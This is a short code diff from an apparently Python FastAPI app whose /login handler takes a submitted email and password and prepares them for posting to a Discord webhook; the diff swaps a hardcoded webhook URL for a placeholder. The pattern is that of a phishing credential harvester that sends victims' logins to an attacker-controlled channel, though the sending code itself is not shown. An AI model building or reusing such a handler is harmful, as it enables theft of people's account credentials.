@@ -18,7 +18,7 @@ async def read_root(request: Request):
 @app.post("/login", response_class=HTMLResponse)
 async def login(request: Request, email: str = Form(...), password: str = Form(...)):
     # Discord webhook URL (replace with your actual webhook URL)
-    discord_webhook_url = "https://discord.com/api/webhooks/1330430550653272124/D7zmeUZNYuXQQmZ0gmNpnAKUt0Hm_ifRtXsfInXSyAy194JflEBLwNwk1VeoOP45_Kmc"
+    discord_webhook_url = "YOUR_DISCORD_WEBHOOK"
 
     # Prepare the data to send to Discord
     data = {
